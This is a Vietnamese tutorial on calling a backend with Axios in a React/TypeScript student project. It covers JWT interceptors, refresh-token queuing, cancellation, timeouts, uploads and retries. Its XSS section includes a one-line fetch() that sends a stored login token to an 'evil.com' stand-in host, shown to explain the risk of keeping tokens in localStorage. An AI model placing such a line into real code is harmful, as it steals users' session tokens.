# Axios & API — Cách FE gọi Backend

---

## Axios là gì?

Thư viện HTTP client — giúp FE **gọi API** tới Backend. Giống `fetch()` nhưng tiện hơn.

### Tại sao không dùng fetch()?

```tsx
// fetch() — phải tự xử lý nhiều thứ
const res = await fetch('http://localhost:8088/api/movies');
const data = await res.json();            // phải tự parse JSON
if (!res.ok) throw new Error(res.status); // phải tự check lỗi

// axios — tự động hết
const { data } = await api.get('/api/movies');
// Tự parse JSON, tự throw error khi status >= 400
```

---

## Axios Instance — Cấu hình 1 lần, dùng mãi

```tsx
// src/api/axios.ts
import axios from 'axios';

const api = axios.create({
    baseURL: import.meta.env.VITE_API_BASE_URL || 'http://localhost:8088',
    // ↑ Đọc từ .env.development → không hardcode URL
    headers: {
        'Content-Type': 'application/json',
    },
});

export default api;

// Sử dụng
import api from '../api/axios';
const { data } = await api.get('/api/movies');
// → gọi http://localhost:8088/api/movies
```

---

## JWT Interceptor — Tự gắn token vào mọi request

### Vấn đề
Mỗi API cần đăng nhập → phải gắn header `Authorization: Bearer <token>`.
Nếu viết thủ công → MỌI chỗ gọi API đều phải viết:

```tsx
// THỦ CÔNG — phải viết mỗi lần gọi API
const token = localStorage.getItem('token');
const { data } = await axios.get('/api/movies', {
    headers: { Authorization: `Bearer ${token}` }
});
// 50 chỗ gọi API → viết 50 lần → dễ quên
```

### Giải pháp: Interceptor — tự động gắn

```tsx
// Request interceptor — chạy TRƯỚC mỗi request
api.interceptors.request.use((config) => {
    const token = localStorage.getItem('token');
    if (token) {
        config.headers.Authorization = `Bearer ${token}`;
        // ↑ TỰ ĐỘNG gắn token vào header
    }
    return config;
});

// Response interceptor — chạy SAU mỗi response
api.interceptors.response.use(
    (response) => response,   // thành công → trả response bình thường
    (error) => {
        if (error.response?.status === 401) {
            // Token hết hạn hoặc sai
            localStorage.removeItem('token');
            window.location.href = '/login';
            // ↑ Redirect về trang đăng nhập
        }
        return Promise.reject(error);
    },
);
```

### Luồng hoạt động

```
Component gọi: api.get('/api/movies')
    │
    ▼
Request Interceptor:
    → Lấy token từ localStorage
    → Gắn header: Authorization: Bearer eyJ...
    │
    ▼
Gửi request tới Backend: GET http://localhost:8088/api/movies
    │
    ▼
Backend xử lý → trả response
    │
    ▼
Response Interceptor:
    → Status 200 → trả data bình thường
    → Status 401 → xóa token → redirect /login
    │
    ▼
Component nhận data
```

---

## Cách gọi API

### GET — Đọc dữ liệu

```tsx
// Danh sách phim
const { data } = await api.get('/api/movies');

// Với query params
const { data } = await api.get('/api/movies', {
    params: { search: 'Avengers', genreId: 1, page: 0, size: 10 }
});
// → GET /api/movies?search=Avengers&genreId=1&page=0&size=10

// Chi tiết 1 phim
const { data } = await api.get(`/api/movies/${id}`);
```

### POST — Tạo mới

```tsx
// Đăng ký
const { data } = await api.post('/api/auth/register', {
    username: 'vanan',
    email: 'an@gmail.com',
    password: '123456',
});

// Hold ghế
const { data } = await api.post('/api/bookings/hold', {
    showtimeId: 1,
    seatIds: [5, 6, 7],
});
```

### PUT — Sửa

```tsx
// Sửa profile
const { data } = await api.put('/api/users/me', {
    fullName: 'Vũ Tường An',
    phone: '0912345678',
});
```

### DELETE — Xóa

```tsx
// Xóa phim (soft delete)
await api.delete(`/api/movies/${id}`);
```

---

## Xử lý Response từ Backend

Backend luôn trả format `ApiResponse`:

```json
{
    "success": true,
    "message": "OK",
    "data": { ... },
    "timestamp": "2026-05-13T10:00:00"
}
```

```tsx
// Lấy data thật
const response = await api.get('/api/movies');
const apiResponse = response.data;           // { success, message, data, timestamp }
const movies = apiResponse.data;             // data thật (danh sách phim)
const firstMovie = apiResponse.data.content[0]; // phim đầu tiên (nếu phân trang)

// Với TanStack Query — lấy trực tiếp
const { data } = useQuery({
    queryKey: ['movies'],
    queryFn: () => api.get('/api/movies').then(res => res.data.data),
    // ↑ res.data = ApiResponse, res.data.data = data thật
});
```

---

## Error Handling

```tsx
try {
    const { data } = await api.post('/api/auth/login', { username, password });
    // Thành công
} catch (error) {
    if (axios.isAxiosError(error)) {
        const message = error.response?.data?.message || 'An error occurred';
        // VD: "Invalid username or password"
        alert(message);
    }
}

// Với TanStack Query — error tự động
const { error } = useQuery({ ... });
if (error) {
    const message = error.response?.data?.message || 'Error';
}
```

---

## 4. Refresh Token Flow — Cốt lõi

### 4.1. Vấn đề nguyên thủy

Trong hệ thống CineX, sau khi user đăng nhập, backend cấp 2 token:
- **Access token:** hết hạn sau **15 phút**, dùng để gọi mọi API
- **Refresh token:** hết hạn sau **7 ngày**, chỉ dùng để xin access token mới

Nếu KHÔNG có refresh token flow:
- Sau 15 phút, mọi request đều trả 401 Unauthorized
- User bị đá ra màn hình login giữa lúc đang đặt vé
- Trải nghiệm tệ, user cáu bỏ app

Mục tiêu: khi access token hết hạn, FE tự động xin token mới một cách **trong suốt** với user — không cần user thao tác gì.

### 4.2. Pattern axios interceptor 401 — auto refresh — retry

Ý tưởng: bọc mọi response 401 trong interceptor, gọi `/auth/refresh` để xin token mới, sau đó replay request cũ.

```ts
api.interceptors.response.use(
  (res) => res,
  async (error) => {
    const config = error.config;
    if (error.response?.status === 401 && !config._retry) {
      config._retry = true;
      const refreshToken = localStorage.getItem('refreshToken');
      const { data } = await axios.post('/auth/refresh', { refreshToken });
      localStorage.setItem('token', data.accessToken);
      config.headers.Authorization = `Bearer ${data.accessToken}`;
      return api(config);  // Replay request cũ với token mới
    }
    return Promise.reject(error);
  }
);
```

### 4.3. Giải thích từng dòng

- `config._retry = true` — cờ đánh dấu request ĐÃ retry rồi, tránh loop vô hạn. Nếu refresh xong vẫn 401 → không retry lần 2, cho user log out.
- `axios.post('/auth/refresh', ...)` — dùng axios GỐC chứ KHÔNG dùng `api.post`. Lý do: `api` có interceptor 401, nếu refresh cũng fail 401 → interceptor lại gọi refresh → infinite loop.
- `return api(config)` — gọi lại request cũ với config đã được cập nhật header. Axios tự promise-chain, caller hoàn toàn không biết đã có refresh xảy ra.

### 4.4. Sơ đồ ASCII luồng refresh

```
User clicks "Đặt vé"
        |
        v
api.post('/booking')   <-- access token cũ (đã expire)
        |
        v
Backend trả 401
        |
        v
Interceptor bắt được, kiểm tra _retry
        |
        v
axios.post('/auth/refresh')   <-- gửi refresh token
        |
        v
Backend trả accessToken MỚI
        |
        v
localStorage.setItem('token', newToken)
        |
        v
api(config)   <-- replay /booking với token mới
        |
        v
Backend trả 200 OK + booking data
        |
        v
Component nhận data như chưa có gì xảy ra
```

### 4.5. Cảnh báo quan trọng

- **KHÔNG** dùng `api.post('/auth/refresh')` — sẽ infinite loop nếu refresh token cũng hết hạn.
- **KHÔNG** quên `_retry` flag — request fail liên tục sẽ tốn tài nguyên server.
- Nếu refresh fail (refresh token hết hạn 7 ngày): redirect về `/login` ngay.

---

## 5. failedQueue — Xử lý race condition

### 5.1. Vấn đề: 5 request fail 401 đồng thời

Tưởng tượng user mở trang Dashboard, gồm 5 widget gọi 5 API song song:
- `/api/movies/stats`
- `/api/bookings/today`
- `/api/users/count`
- `/api/payments/recent`
- `/api/showtimes/upcoming`

Cả 5 request cùng dùng access token đã hết hạn → cả 5 nhận 401 cùng lúc. Nếu interceptor 4.2 chạy nguyên bản:
- 5 interceptor gọi `/auth/refresh` SONG SONG
- Server nhận 5 refresh request → cấp 5 token mới (mỗi lần cấp invalidate token trước)
- 4 trong 5 request retry với token đã bị invalidate → lại fail
- Loop loạn, server overload

### 5.2. Giải pháp: queue + cờ isRefreshing

Chỉ cho phép **1 refresh duy nhất** chạy. Các request 401 đến sau xếp hàng đợi.

```ts
let isRefreshing = false;
let failedQueue: Array<{
  resolve: (token: string) => void;
  reject: (error: any) => void;
}> = [];

const processQueue = (error: any, token: string | null = null) => {
  failedQueue.forEach(p => {
    if (error) p.reject(error);
    else p.resolve(token!);
  });
  failedQueue = [];
};
```

Trong interceptor:

```ts
if (error.response?.status === 401 && !config._retry) {
  if (isRefreshing) {
    // Đã có refresh đang chạy, đợi nó xong
    return new Promise((resolve, reject) => {
      failedQueue.push({ resolve, reject });
    }).then((token) => {
      config.headers.Authorization = `Bearer ${token}`;
      return api(config);
    });
  }
  config._retry = true;
  isRefreshing = true;
  try {
    const { data } = await axios.post('/auth/refresh', { refreshToken });
    localStorage.setItem('token', data.accessToken);
    processQueue(null, data.accessToken);
    config.headers.Authorization = `Bearer ${data.accessToken}`;
    return api(config);
  } catch (err) {
    processQueue(err, null);
    return Promise.reject(err);
  } finally {
    isRefreshing = false;
  }
}
```

### 5.3. Giải thích cơ chế queue

- Request đầu tiên 401 → set `isRefreshing = true`, gọi refresh.
- Request 2-5 401 → thấy `isRefreshing === true` → push vào `failedQueue` rồi đợi (Promise pending).
- Refresh xong → `processQueue(null, newToken)` resolve TẤT CẢ promise trong queue với token mới.
- Mỗi request được resolve sẽ tự retry với token mới.

### 5.4. Tại sao quan trọng

Không có queue: 5 refresh đồng thời → server tốn 5x resource, có thể bị rate limit, có thể trả 5 token khác nhau gây race.

Có queue: chỉ 1 refresh, 4 request còn lại "ngủ" chờ → sau đó được "đánh thức" với token đã cập nhật.

---

## 6. Type-safe axios với Generic

### 6.1. Vấn đề: TypeScript không biết response trả gì

```ts
const res = await api.get('/api/movies/1');
console.log(res.data.title);  // any, không có IntelliSense
```

### 6.2. Dùng generic của axios

```ts
interface MovieResponse {
  id: number;
  title: string;
  genres: string[];
  duration: number;
}

const res = await api.get<MovieResponse>('/api/movies/1');
console.log(res.data.title);  // IntelliSense gợi ý, type-check
```

`api.get<T>` trả `AxiosResponse<T>` → `.data` có type `T`.

### 6.3. Vấn đề: ApiResponse wrapper

Backend CineX wrap mọi response:
```json
{ "success": true, "data": { ... }, "message": "OK" }
```

Mỗi lần dùng phải `.data.data` rất xấu:
```ts
const res = await api.get<ApiResponse<MovieResponse>>('/api/movies/1');
const movie = res.data.data;  // 2 lần .data
```

### 6.4. Helper bỏ wrapper

```ts
async function apiGet<T>(url: string, config?: AxiosRequestConfig): Promise<T> {
  const res = await api.get<ApiResponse<T>>(url, config);
  return res.data.data;
}

async function apiPost<T>(url: string, body?: any): Promise<T> {
  const res = await api.post<ApiResponse<T>>(url, body);
  return res.data.data;
}
```

Dùng:
```ts
const movie = await apiGet<MovieResponse>('/api/movies/1');
console.log(movie.title);  // 1 lần .data ẩn trong helper
```

### 6.5. Lợi ích

- Giảm boilerplate.
- Type-safe end-to-end: BE đổi field → FE compile error ngay.
- Refactor an toàn: rename field, IDE tự update mọi nơi.

---

## 7. AbortController — Cancel request

### 7.1. Vấn đề: component unmount giữa lúc fetching

User click vào trang `/admin/movies`, component bắt đầu fetch `/api/movies`. Trước khi response về, user click sang `/admin/users`. Component cũ unmount.

Nếu request vẫn chạy:
- Khi response về, gọi `setState` trên component đã unmount → React warning "Can't perform a state update on an unmounted component".
- Tốn bandwidth, server xử lý vô ích.

### 7.2. Giải pháp: AbortController

Web API chuẩn để cancel async task. Axios hỗ trợ qua `signal`.

```ts
useEffect(() => {
  const controller = new AbortController();

  api.get('/api/movies', { signal: controller.signal })
    .then(res => setMovies(res.data.data))
    .catch(err => {
      if (axios.isCancel(err)) return;  // Cancel không phải lỗi
      console.error(err);
    });

  return () => controller.abort();  // Cleanup khi unmount
}, []);
```

### 7.3. Giải thích

- `new AbortController()` tạo controller có thuộc tính `.signal`.
- Pass `signal` vào axios config → axios lắng nghe.
- `controller.abort()` → axios reject promise với error có `code: 'ERR_CANCELED'`.
- `axios.isCancel(err)` để phân biệt cancel với lỗi thật.

### 7.4. TanStack Query tự handle

Khi dùng `useQuery`, TanStack tự pass signal:

```ts
useQuery({
  queryKey: ['movies'],
  queryFn: ({ signal }) => api.get('/api/movies', { signal })
});
```

Component unmount → TanStack tự `abort()`. Đây là lý do CineX dùng TanStack: bớt boilerplate.

---

## 8. Timeout — Chặn request treo

### 8.1. Vấn đề

API chậm hoặc treo → user đợi mãi không có feedback. UX tệ.

### 8.2. Set timeout cho instance

```ts
export const api = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL,
  timeout: 10000,  // 10 giây
});
```

Mọi request quá 10s → axios tự reject với error `code: 'ECONNABORTED'`, message `timeout of 10000ms exceeded`.

### 8.3. Handle timeout error

```ts
try {
  await api.get('/api/movies');
} catch (err) {
  if (err.code === 'ECONNABORTED') {
    toast.error('Kết nối chậm, vui lòng thử lại');
  }
}
```

### 8.4. Khi nào KHÔNG nên dùng timeout

- **Upload file lớn:** poster phim 5MB upload qua 3G có thể mất 30s → timeout 10s sẽ fail. Override per-request: `api.post('/upload', formData, { timeout: 60000 })`.
- **Export báo cáo:** server query DB lớn có thể mất 30-60s. Tăng timeout hoặc dùng async job (queue + polling).

### 8.5. Trade-off

- Timeout ngắn: UX tốt nhưng dễ fail trong mạng yếu.
- Timeout dài: chịu được mạng yếu nhưng user đợi lâu.
- CineX chọn 10s default, override cho upload/export.

---

## 9. Upload Progress — Hiển thị tiến độ

### 9.1. Vấn đề

Upload poster phim 5MB, user không biết đang tới đâu → tưởng app treo.

### 9.2. axios onUploadProgress

```ts
const formData = new FormData();
formData.append('file', file);
formData.append('movieId', '123');

await api.post('/api/movies/poster', formData, {
  headers: { 'Content-Type': 'multipart/form-data' },
  onUploadProgress: (e) => {
    if (e.total) {
      const percent = Math.round((e.loaded / e.total) * 100);
      setProgress(percent);
    }
  }
});
```

### 9.3. Giải thích

- `FormData` là API chuẩn để gửi file qua HTTP multipart.
- `onUploadProgress` callback được axios gọi liên tục khi byte được upload.
- `e.loaded` — đã upload bao nhiêu byte.
- `e.total` — tổng size (có thể `undefined` nếu server không trả `Content-Length`).

### 9.4. UI hiển thị

```tsx
<Progress value={progress} className="w-full" />
<span>{progress}%</span>
```

### 9.5. Áp dụng trong CineX

- Upload poster phim (`cinex/posters`).
- Upload avatar user (`cinex/avatars`).
- Upload ảnh snack (`cinex/snacks`).

Tất cả upload lên Cloudinary qua BE, BE trả về URL. UI hiện progress giúp user yên tâm.

---

## 10. Download File — Blob & responseType

### 10.1. Vấn đề

Download báo cáo Excel/PDF. Default axios parse response là JSON → dữ liệu binary bị hỏng.

### 10.2. Dùng responseType: 'blob'

```ts
async function downloadReport() {
  const { data } = await api.get('/api/reports/revenue', {
    responseType: 'blob'
  });
  const url = URL.createObjectURL(data);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'revenue-2026-05.pdf';
  a.click();
  URL.revokeObjectURL(url);  // Giải phóng memory
}
```

### 10.3. Giải thích

- `responseType: 'blob'` → axios giữ nguyên binary data thành Blob.
- `URL.createObjectURL(blob)` → tạo URL tạm trong memory: `blob:http://localhost:5173/abc-123`.
- `<a download>` → tự download khi click.
- `revokeObjectURL` → giải phóng memory (browser không tự dọn).

### 10.4. Lấy tên file từ Content-Disposition

```ts
const { data, headers } = await api.get('/api/reports/revenue', {
  responseType: 'blob'
});
const disposition = headers['content-disposition'];
const match = disposition?.match(/filename="(.+)"/);
const filename = match?.[1] || 'report.pdf';
```

### 10.5. Áp dụng CineX

- Export báo cáo doanh thu theo tháng (PDF).
- Export danh sách user (CSV/Excel).
- Tải hóa đơn đặt vé (PDF).

---

## 11. paramsSerializer — Định dạng query string

### 11.1. Vấn đề

FE gửi filter `genreIds = [1, 2, 3]`:

```ts
api.get('/api/movies', { params: { genreIds: [1, 2, 3] } });
```

Default axios serialize thành: `?genreIds[]=1&genreIds[]=2&genreIds[]=3`.

Spring backend đôi khi expect: `?genreIds=1,2,3` (comma-separated) hoặc `?genreIds=1&genreIds=2&genreIds=3` (repeat).

### 11.2. Custom paramsSerializer với qs library

```bash
npm install qs
npm install -D @types/qs
```

```ts
import qs from 'qs';

export const api = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL,
  paramsSerializer: {
    serialize: (params) => qs.stringify(params, { arrayFormat: 'comma' })
  }
});
```

### 11.3. Các option arrayFormat

| Format | Output |
|---|---|
| `comma` | `genreIds=1,2,3` |
| `repeat` | `genreIds=1&genreIds=2&genreIds=3` |
| `brackets` | `genreIds[]=1&genreIds[]=2` |
| `indices` | `genreIds[0]=1&genreIds[1]=2` |

### 11.4. CineX dùng format nào

Spring `@RequestParam List<Long> genreIds` chấp nhận cả `comma` và `repeat`. CineX chọn `repeat` vì dễ debug khi xem network tab.

---

## 12. Error categorization — 3 loại lỗi

### 12.1. Phân loại

```ts
function classifyError(error: any) {
  if (axios.isCancel(error)) return 'CANCEL';
  if (!error.response) return 'NETWORK';
  return 'HTTP';
}
```

### 12.2. Network error

`!error.response` → không có response từ server. Nguyên nhân:
- Mất mạng (offline).
- Server down.
- CORS chặn (browser block trước khi response về).
- Timeout (`code: 'ECONNABORTED'`).

Xử lý: hiện toast "Mất kết nối, kiểm tra mạng".

### 12.3. HTTP error

`error.response.status >= 400`. Phân loại theo status:

| Status | Loại | Xử lý |
|---|---|---|
| 400 | Bad Request | Hiện validation error từ `error.response.data.errors` |
| 401 | Unauthorized | Refresh token, nếu fail redirect login |
| 403 | Forbidden | Toast "Không có quyền" |
| 404 | Not Found | Hiện page 404 |
| 409 | Conflict | Toast "Dữ liệu đã thay đổi, reload" |
| 422 | Validation | Map error vào form field |
| 500 | Server Error | Toast "Lỗi hệ thống, liên hệ admin" |

### 12.4. Cancel

`axios.isCancel(error)` → request bị abort chủ động. KHÔNG phải lỗi thật, không hiện toast, không log.

### 12.5. Helper tập trung

```ts
function handleApiError(error: any) {
  const type = classifyError(error);
  if (type === 'CANCEL') return;
  if (type === 'NETWORK') {
    toast.error('Mất kết nối, vui lòng kiểm tra mạng');
    return;
  }
  const status = error.response.status;
  const message = error.response.data?.message || 'Có lỗi xảy ra';
  if (status === 401) return;  // Interceptor đã xử lý
  if (status === 403) toast.error('Không có quyền truy cập');
  else if (status >= 500) toast.error('Lỗi hệ thống');
  else toast.error(message);
}
```

---

## 13. Retry với exponential backoff

### 13.1. Vấn đề

Network flaky → 1 request fail nhưng request 2 thành công. Tự retry giúp UX mượt.

### 13.2. Exponential backoff

Lần 1 fail → đợi 1s rồi retry. Lần 2 fail → đợi 2s. Lần 3 → 4s. Tối đa 3 lần.

```ts
async function apiGetWithRetry<T>(url: string, retries = 3): Promise<T> {
  for (let i = 0; i < retries; i++) {
    try {
      return await apiGet<T>(url);
    } catch (err: any) {
      if (i === retries - 1) throw err;
      if (err.response && err.response.status < 500) throw err;  // Không retry 4xx
      const delay = Math.pow(2, i) * 1000;  // 1s, 2s, 4s
      await new Promise(r => setTimeout(r, delay));
    }
  }
  throw new Error('unreachable');
}
```

### 13.3. Khi nào retry

- **Có:** network error (`!error.response`), timeout, 502/503/504 (server tạm thời).
- **KHÔNG:** 400 (bad request — user gửi sai, retry vô nghĩa), 401 (đã có interceptor refresh), 403 (không quyền — retry không giải quyết), 404 (resource không tồn tại).

### 13.4. Library axios-retry

Thay vì tự viết, dùng `axios-retry`:
```ts
import axiosRetry from 'axios-retry';

axiosRetry(api, {
  retries: 3,
  retryDelay: axiosRetry.exponentialDelay,
  retryCondition: (err) => !err.response || err.response.status >= 500,
});
```

### 13.5. CineX dùng cho

- API thống kê (báo cáo): chậm nhưng quan trọng, retry tăng tỷ lệ thành công.
- API đọc danh sách (movies, showtimes): idempotent, retry an toàn.
- KHÔNG dùng cho `POST /api/bookings` (tạo booking 2 lần → 2 vé).

---

## 14. Base URL từ environment variable

### 14.1. Vấn đề

Dev: `http://localhost:8088`. Production: `https://api.cinex.vn`. Staging: `https://staging-api.cinex.vn`.

Hardcode trong code → mỗi lần deploy phải sửa code, dễ commit nhầm.

### 14.2. Vite env vars

Vite đọc file `.env.{mode}`:
- `.env.development` — khi `npm run dev`
- `.env.production` — khi `npm run build`
- `.env.staging` — custom mode

Prefix BẮT BUỘC `VITE_` để Vite expose cho client (bảo mật: không lộ secret ra browser).

`.env.development`:
```
VITE_API_BASE_URL=http://localhost:8088
VITE_CLOUDINARY_NAME=cinex-dev
```

`.env.production`:
```
VITE_API_BASE_URL=https://api.cinex.vn
VITE_CLOUDINARY_NAME=cinex-prod
```

### 14.3. Dùng trong code

```ts
export const api = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL,
  timeout: 10000,
});
```

### 14.4. Type-safe env

`src/vite-env.d.ts`:
```ts
interface ImportMetaEnv {
  readonly VITE_API_BASE_URL: string;
  readonly VITE_CLOUDINARY_NAME: string;
}
interface ImportMeta {
  readonly env: ImportMetaEnv;
}
```

### 14.5. .gitignore

```
.env.local
.env.*.local
```

KHÔNG commit `.env` chứa secret. Commit `.env.example` làm template.

---

## 15. Interceptor chain — Thứ tự gọi

### 15.1. Vấn đề

Project lớn có nhiều interceptor:
- Gắn JWT token vào header.
- Log request/response.
- Transform response (unwrap `ApiResponse`).
- Handle 401 refresh.

Thứ tự đăng ký có quan trọng không? CÓ.

### 15.2. Quy luật

- **Request interceptor:** chạy theo thứ tự NGƯỢC với đăng ký. Last registered → first executed.
- **Response interceptor:** chạy theo thứ tự ĐĂNG KÝ. First registered → first executed.

### 15.3. Ví dụ CineX

```ts
// Đăng ký 1: gắn token
api.interceptors.request.use(config => {
  const token = localStorage.getItem('token');
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});

// Đăng ký 2: log
api.interceptors.request.use(config => {
  console.log('[REQ]', config.method, config.url);
  return config;
});

// Đăng ký 3: handle 401
api.interceptors.response.use(r => r, async err => {
  if (err.response?.status === 401) { /* refresh */ }
  return Promise.reject(err);
});

// Đăng ký 4: unwrap data
api.interceptors.response.use(res => {
  if (res.data?.success === true) return res.data.data;
  return res;
});
```

Khi gọi `api.get('/movies')`:
1. **Request:** log → gắn token → gửi.
2. **Response:** handle 401 → unwrap data → trả cho caller.

### 15.4. Lý do design này

Request interceptor reverse order: muốn LOG sau khi đã gắn token (để log token), nhưng đăng ký LOG TRƯỚC vì nó là cross-cutting concern. Đăng ký reverse → execute đúng thứ tự logic.

Response interceptor forward order: 401 handler phải chạy TRƯỚC unwrap, nên đăng ký TRƯỚC.

### 15.5. Cảnh báo

- Cẩn thận khi interceptor nào throw → các interceptor sau KHÔNG chạy.
- Async interceptor (return Promise) → chain wait đến khi resolve.

---

## 16. Mock API trong dev với MSW

### 16.1. Vấn đề

BE chưa làm xong endpoint `/api/recommendations`, FE đang cần để build UI. Đợi BE → block tiến độ.

Cách cũ: mock trong component (`if (DEV) return fakeData`) → code bẩn, quên xóa khi production.

### 16.2. MSW (Mock Service Worker)

Mock ở tầng **network**: dùng Service Worker intercept request thật, trả response giả. Code component không cần biết gì.

```ts
import { setupWorker, rest } from 'msw';

const worker = setupWorker(
  rest.get('/api/recommendations', (req, res, ctx) => {
    return res(ctx.json({
      success: true,
      data: [
        { id: 1, title: 'Avatar 3' },
        { id: 2, title: 'Inception 2' }
      ]
    }));
  })
);

if (import.meta.env.DEV) {
  worker.start();
}
```

### 16.3. Lợi ích

- Code component nguyên vẹn: vẫn `api.get('/api/recommendations')`.
- Network tab thấy request thật → debug như production.
- Bật/tắt MSW bằng env variable.
- BE xong → xóa mock handler, không động chạm code khác.

### 16.4. Khi nào dùng

- Endpoint BE chưa có.
- Test error scenario khó tạo (500, timeout).
- Demo offline (presentation không có server).

### 16.5. CineX áp dụng

Dùng MSW cho endpoint thống kê phức tạp (BE đang viết): `/api/admin/stats/revenue`, `/api/admin/stats/top-movies`.

---

## 17. Lưu token vào localStorage — Cảnh báo XSS

### 17.1. Vấn đề bảo mật

`localStorage` accessible từ JavaScript. Nếu site bị XSS (Cross-Site Scripting), attacker chạy:

```js
fetch('https://evil.com/steal', {
  method: 'POST',
  body: localStorage.getItem('token')
});
```

→ Token bị đánh cắp, attacker mạo danh user.

### 17.2. Giải pháp 1: HttpOnly Cookie

Backend set token vào cookie với flag `HttpOnly`. JavaScript KHÔNG đọc được. Browser tự gửi cookie kèm request.

```
Set-Cookie: accessToken=xxx; HttpOnly; Secure; SameSite=Strict
```

Ưu điểm: XSS không lấy được token.
Nhược điểm: dễ bị CSRF (attacker fake request từ site khác, browser tự gửi cookie kèm).

### 17.3. Trade-off XSS vs CSRF

| Phương án | Nguy cơ | Bảo vệ |
|---|---|---|
| localStorage | XSS | CSP, sanitize input |
| HttpOnly Cookie | CSRF | SameSite cookie, CSRF token |

### 17.4. Tại sao CineX chọn localStorage

- **Đơn giản:** không cần config CORS cho cookie, không cần CSRF token.
- **API thuần:** FE và BE khác origin (localhost:5173 vs localhost:8088). HttpOnly cookie phải config `Secure + SameSite=None + credentials: include` rất phức tạp.
- **Đồ án học tập:** ưu tiên hiểu kiến trúc hơn là production-grade security.
- **Bảo vệ XSS bằng React:** React tự escape JSX, ít risk XSS hơn vanilla JS.

### 17.5. Mitigation cho production

Nếu deploy thật, làm thêm:
- Content Security Policy (CSP) header chặn inline script.
- Sanitize mọi user input render ra HTML.
- Token expire ngắn (15 phút) — giảm thiệt hại nếu bị steal.
- Refresh token rotation: mỗi lần refresh, server cấp token mới và invalidate token cũ.

---

## 18. Câu hỏi tự kiểm tra

1. Vì sao trong refresh token interceptor phải dùng `axios.post('/auth/refresh')` thay vì `api.post(...)`?
2. Nếu KHÔNG có `failedQueue` và 10 widget cùng fail 401, điều gì xảy ra với server?
3. Khi nào nên cancel request bằng AbortController? Đưa ra 1 ví dụ cụ thể trong CineX.
4. `responseType: 'blob'` dùng để làm gì? Tại sao không thể download file PDF với responseType default?
5. Tại sao CineX lưu token vào localStorage thay vì HttpOnly cookie? Hệ lụy bảo mật là gì và cách giảm thiểu?

